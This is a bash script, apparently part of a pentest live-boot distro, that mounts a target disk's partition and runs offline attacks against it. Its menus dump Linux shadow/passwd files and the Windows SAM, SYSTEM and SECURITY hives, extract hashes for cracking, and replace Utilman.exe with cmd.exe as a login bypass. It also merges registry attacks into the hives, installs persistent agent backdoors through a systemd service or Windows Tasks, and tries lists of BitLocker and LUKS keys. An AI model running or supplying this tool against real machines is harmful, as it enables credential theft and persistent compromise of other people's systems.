#!/bin/bash
# os_killer.sh
# Created on: Sat 29 Jul 2023 08:18:34 PM CEST
#
#  ____   __  ____  __
# (  _ \ /. |(  _ \/  )
#  )___/(_  _))___/ )(
# (__)    (_)(__)  (__)
#
# Description:
#  A script that will let you take a partition mount it and do a few simple
#  attacks on it. For windows partitions it will dump the SAM database to the
#  tmp of the p3ng0s system and will also let you change cmd.exe to utilman.exe.
#  For linux it will allow you to have a copy of etc/shadow and etc/passwd on the
#  tmp of the p3ng0s system and will also allow you to chroot inside of  the system
#  for extra control ^^
# Usage:
#  This script is usually run by .bash_profile during the welcome page of p3ng0s
#  but can be run independantly.

PART=
LOOT_FOLDER=$([ -d /home/p4p1-live/loot ] && echo '/home/p4p1-live/loot' || echo '/tmp')

echo $LOOT_FOLDER

function banner() {
	echo -e "\e[31m               .-')            .-. .-')                                 ('-.  _  .-')   \e[0m"
	echo -e "\e[31m              ( OO ).          \\  ( OO )                              _(  OO)( \\( -O )  \e[0m"
	echo -e "\e[31m .-'),-----. (_)---\_)         ,--. ,--.  ,-.-')  ,--.      ,--.     (,------.,------.  \e[0m"
	echo -e "\e[31m( OO'  .-.  '/    _ |          |  .'   /  |  |OO) |  |.-')  |  |.-')  |  .---'|   /\`. ' \e[0m"
	echo -e "\e[31m/   |  | |  |\\  :\` \`.          |      /,  |  |  \\ |  | OO ) |  | OO ) |  |    |  /  | | \e[0m"
	echo -e "\e[31m\\_) |  |\|  | '..\`''.)  (\`-.   |     ' _) |  |(_/ |  |\`-' | |  |\`-' |(|  '--. |  |_.' | \e[0m"
	echo -e "\e[31m  \\ |  | |  |.-._)   \\ (OO  )_ |  .   \\  ,|  |_.'(|  '---.'(|  '---.' |  .--' |  .  '.' \e[0m"
	echo -e "\e[31m   \`'  '-'  '\\       /,------.)|  |\\   \\(_|  |    |      |  |      |  |  \`---.|  |\\  \\  \e[0m"
	echo -e "\e[31m     \`-----'  \`-----' \`------' \`--' '--'  \`--'    \`------'  \`------'  \`------'\`--' '--' \e[0m"
}

function linux_hashcat_exp() {
    systemctl stop p3ng0s-cracker-watcher.path
    HASHES=$(grep -E '^\w+:\$[6y]\$' /mnt/etc/shadow | cut -d: -f2)
    [ ! -d $LOOT_FOLDER/hashcat ] && mkdir -p $LOOT_FOLDER/hashcat
    if grep -q '^\w+:\$y\$' /etc/shadow; then
        MODE="28000" # Yescrypt
    else
        MODE="1800"  # SHA-512
    fi
    grep -E '^\w+:\$[6y]\$' /mnt/etc/shadow | cut -d: -f2 > $LOOT_FOLDER/hashcat/hash.$MODE
}

function linux_systemd_infect_exp() {
    if [ -f $LOOT_FOLDER/agent.elf ]; then
        [ ! -d /mnt/usr/local/bin ] && mkdir -p /mnt/usr/local/bin
        [ ! -d /mnt/etc/systemd/system/multi-user.target.wants ] && mkdir -p /mnt/etc/systemd/system/multi-user.target.wants/
        cp -r $LOOT_FOLDER/agent.elf /mnt/usr/local/bin/agent
        chmod +x /mnt/usr/local/bin/agent
        cp -r /etc/p3ng0s/os_killer/infect.service /mnt/etc/systemd/system/infect.service
        ln -sf /etc/systemd/system/infect.service /mnt/etc/systemd/system/multi-user.target.wants/infect.service
    fi
}

function linux_exp() {
    while true; do
        SEL=$(dialog --title "What are you looking for?" \
            --menu "...." 20 70 15 \
            1 "r: dump passwd & shadow" \
            2 "w: chroot :)" \
            3 "r: Dump the hashes to then hashcat them ^^" \
            4 "w: Systemd infection (requires: loot/agent.elf)" \
            2>&1 >/dev/tty)
        EXIT_STATUS=$?

        if [ $EXIT_STATUS -ne 0 ]; then
            echo "Exiting..."
            break
        fi

        [ $SEL = 1 ] && $(cp -r /mnt/etc/passwd $LOOT_FOLDER/passwd; cp -r /mnt/etc/shadow $LOOT_FOLDER/shadow)
        [ $SEL = 2 ] && chroot /mnt
        [ $SEL = 3 ] && linux_hashcat_exp
        [ $SEL = 4 ] && linux_systemd_infect_exp
    done

    echo -e "\e[1;31m[!]\e[m All of the ouput and results are inside of $LOOT_FOLDER :)"
    sleep 1
}

function windows_hashcat_exp() {
    systemctl stop p3ng0s-cracker-watcher.path
    [ ! -d $LOOT_FOLDER/hashcat ] && mkdir -p $LOOT_FOLDER/hashcat
    cp -r /mnt/Windows/System32/config/SAM $LOOT_FOLDER/SAM
    cp -r /mnt/Windows/System32/config/SYSTEM $LOOT_FOLDER/SYSTEM
    cp -r /mnt/Windows/System32/config/SECURITY $LOOT_FOLDER/SECURITY
    /opt/pentest/impacket/bin/secretsdump.py -sam $LOOT_FOLDER/SAM -system $LOOT_FOLDER/SYSTEM -security $LOOT_FOLDER/SECURITY LOCAL | grep -E '^[^:]+:[^:]+:[^:]+:([a-fA-F0-9]{32}):{3}$' | cut -d: -f4 > $LOOT_FOLDER/hashcat/hash.1000
}

function windows_registry_exp() {
    if [ -d "$LOOT_FOLDER/reg/" ]; then
        local items=()
        local declare -A file_map
        local i=1
        for filepath in "$LOOT_FOLDER/reg"/*.reg; do
            [[ -f "$filepath" ]] || continue
            filename=$(basename "$filepath")

            hive=$(echo "$filename" | cut -d'_' -f1)
            display_name=$(echo "$filename" | sed "s/^${hive}_//" | sed 's/\.reg$//' | tr '-' ' ')

            tag="${filename}"
            label="[${hive}] ${display_name}"

            file_map["$i"]="$filename"
            items+=("$i" "[$hive] $display_name")
            ((i++))
        done
        SEL=$(dialog --title "Registry Attack Selector" \
            --menu "Select attack(s) to apply:" 20 70 10 \
            "${items[@]}" \
            2>&1 >/dev/tty)

        filename=$(basename "${file_map[$SEL]}")
        hive=$(echo "$filename" | cut -d'_' -f1)
        hivexregedit --merge "/mnt/Windows/System32/config/$hive" "$LOOT_FOLDER/reg/$filename"
    fi
    sleep 2 # sleep here to see output if something went wrong
}

function windows_user_login_exp() {
    if [ -f $LOOT_FOLDER/agent.exe ]; then
        [ ! -d /mnt/Windows/Tasks/p3ng0s/ ] && mkdir -p /mnt/Windows/Tasks/p3ng0s/
        cp $LOOT_FOLDER/agent.exe /mnt/Windows/Tasks/p3ng0s/agent.exe
    fi
}

function windows_boot_service_exp() {
    if [ -f $LOOT_FOLDER/agent.svc.exe ]; then
        [ ! -d /mnt/Windows/Tasks/p3ng0s/ ] && mkdir -p /mnt/Windows/Tasks/p3ng0s/
        cp $LOOT_FOLDER/agent.svc.exe /mnt/Windows/Tasks/p3ng0s/agent.svc.exe
    fi
}

function windows_exp() {
    while true; do
        SEL=$(dialog --title "What are you looking for?" \
            --menu "...." 20 70 15 \
            1 "r: Dump SAM/SYSTEM/SECURITY/SOFTWARE ^^" \
            2 "r: Dump the hashes to then hashcat them ^^" \
            3 "w: Swap cmd.exe and utilman.exe" \
            4 "rw: Secrets dump me baby right now" \
            5 "rw: Registery HIVE Attacks! (requires: loot/reg/*.reg)" \
            6 "rw: Install agent.exe on target (requires: loot/agent.exe)" \
            7 "rw: Install agent.svc.exe on target(requires: loot/agent.svc.exe)" \
            2>&1 >/dev/tty)
        EXIT_STATUS=$?

        if [ $EXIT_STATUS -ne 0 ]; then
            echo "Exiting..."
            break
        fi

        [ $SEL = 1 ] && $(cp -r /mnt/Windows/System32/config/SAM $LOOT_FOLDER/SAM ; cp -r /mnt/Windows/System32/config/SYSTEM $LOOT_FOLDER/SYSTEM; cp -r /mnt/Windows/System32/config/SECURITY $LOOT_FOLDER/SECURITY; cp -r /mnt/Windows/System32/config/SOFTWARE $LOOT_FOLDER/SOFTWARE)
        [ $SEL = 2 ] && windows_hashcat_exp
        [ $SEL = 3 ] && cp -r /mnt/Windows/System32/cmd.exe /mnt/Windows/System32/Utilman.exe
        [ $SEL = 4 ] && /opt/pentest/impacket/bin/secretsdump.py -sam /mnt/Windows/System32/config/SAM -system /mnt/Windows/System32/config/SYSTEM -security /mnt/Windows/System32/config/SECURITY LOCAL | tee >(cat) > $LOOT_FOLDER/secretsdump.log
        [ $SEL = 5 ] && windows_registry_exp
        [ $SEL = 6 ] && windows_user_login_exp
        [ $SEL = 7 ] && windows_boot_service_exp
    done

    echo -e "\e[1;31m[!]\e[m All of the ouput and results are inside of $LOOT_FOLDER :)"
    sleep 1
}

function select_os() {
    [ $? -ne 0 ] && $(sleep 4;exit -1)
    OS_SEL=$(dialog --title "Select a operating system" \
        --menu "Choose a partition to proceed (ordered by size):" 20 70 15 \
        1 "Windows" \
        2 "Linux" \
        2>&1 >/dev/tty)
    if [ $OS_SEL = 1 ]; then
        hybernation_check
        windows_exp
    elif [ $OS_SEL = 2 ]; then
        mount $PART /mnt
        linux_exp
    fi
}

function hybernation_check() {
    mkdir -p /mnt/ntfs_test
    echo "[!] Please wait for the hibernation checks...."
    MOUNT_TEST=$(mount -t ntfs-3g "$PART" /mnt/ntfs_test 2>&1)
    umount /mnt/ntfs_test 2>/dev/null
    rmdir /mnt/ntfs_test 2>/dev/null

    if echo "$MOUNT_TEST" | grep -qi "hibernated"; then
        SEL=$(dialog --title "Hibernation Detected!" \
            --menu "\nWindows is hibernated on $PART.\nWhat do you want to do?" 15 60 3 \
            1 "Mount Read-Only (safe, limited attacks)" \
            2 "Remove hibernation file (recommended)" \
            3 "Nuclear do not use this option!" \
            2>&1 >/dev/tty)

        [ $SEL = 1 ] && mount -t ntfs-3g -o ro "$PART" /mnt
        [ $SEL = 2 ] && $(ntfsfix -d "$PART" ; mount -o remove_hiberfile "$PART" /mnt)
        [ $SEL = 3 ] && mount -t ntfs-3g -o remove_hiberfile=no "$PART" /mnt
    else
        mount $PART /mnt
    fi
}

function encryption_check() {
    DEV=$PART
    TYPE=$(blkid -s TYPE -o value $DEV)
    if [[ "$TYPE" == "BitLocker" ]]; then
        echo "[!] BitLocker detected on $DEV"
        if [[ -f "/home/p4p1-live/loot/bitlocker.txt" ]]; then
            while IFS= read -r key || [[ -n "$key" ]]; do
                [[ -z "$key" || "$key" =~ ^# ]] && continue
                echo "Trying recovery key: $key"
                echo "$key" | cryptsetup open --type=bitlk "$DEV" unlock &>/dev/null
                if [[ $? -eq 0 ]]; then
                    echo "[+] BitLocker unlocked with key from file!"
                    PART=/dev/mapper/unlock
                    echo "/dev/mapper/unlock"
                    ntfsfix -d $PART
                    return 0
                fi
            done < /home/p4p1-live/loot/bitlocker.txt
        fi
        echo "[-] Recovery keys from file failed or not found."
        read -s -p "Enter BitLocker Recovery Key or Password: " user_pass
        echo
        echo "$user_pass" | cryptsetup open --type=bitlk "$DEV" unlock
        if [[ $? -eq 0 ]]; then
            PART=/dev/mapper/unlock
            echo "/dev/mapper/unlock"
            ntfsfix -d $PART
            return 0
        else
            echo "[!] Failed to unlock BitLocker. Exiting."
            sleep 1
            exit 1
        fi
    elif [[ "$TYPE" == "crypto_LUKS" ]]; then
        echo "[!] Crypto LUKS detected on $DEV"
        if [[ -f "/home/p4p1-live/loot/luks.txt" ]]; then
            while IFS= read -r pass || [[ -n "$pass" ]]; do
                [[ -z "$pass" || "$pass" =~ ^# ]] && continue
                echo -n "$pass" | cryptsetup open "$DEV" unlock &>/dev/null
                if [[ $? -eq 0 ]]; then
                    echo "[+] LUKS unlocked with password from file!"
                    PART=/dev/mapper/unlock
                    echo "/dev/mapper/unlock"
                    return 0
                fi
            done < /home/p4p1-live/loot/luks.txt
        fi

        echo "[-] LUKS passwords from file failed."
        read -s -p "Enter LUKS Passphrase: " user_pass
        echo
        echo -n "$user_pass" | cryptsetup open "$DEV" unlock
        if [[ $? -eq 0 ]]; then
            echo "/dev/mapper/unlock"
            PART=/dev/mapper/unlock
            return 0
        else
            echo "[!] Failed to unlock LUKS. Exiting."
            exit 1
        fi
    fi
}

function list_hard_drives() {
    partitions=$(lsblk -npo NAME,SIZE --sort SIZE | tac)
    partition_options=()
    while read -r name size; do
        partition_options+=( "$name" "$name ($size)" )
    done <<< "$partitions"
    selected_partition=$(dialog --title "Select a Partition" \
                                 --menu "Choose a partition to proceed (ordered by size):" 20 70 15 \
                                 "${partition_options[@]}" \
                                 2>&1 >/dev/tty)
    if [[ -z "$selected_partition" ]]; then
        echo -e "\e[1;31m[!]\e[m No partition selected. Exiting.. ^^"
        exit 0
    fi
    PART=$selected_partition
}

if [ "$EUID" -ne 0 ]; then
    banner
    echo -e "\e[1;31m[!]\e[m Please enter the root password (default: p4p1)"
    exec sudo bash "$0" "$@"
else
    export DIALOGRC="/etc/p3ng0s/dialogrc"
    list_hard_drives
    encryption_check
    select_os
fi

umount /mnt
cryptsetup close unlock
echo -e "\e[1;32m[*]\e[m you will now be booting in the gui environement if run at startup ^^"
sleep 5
exit
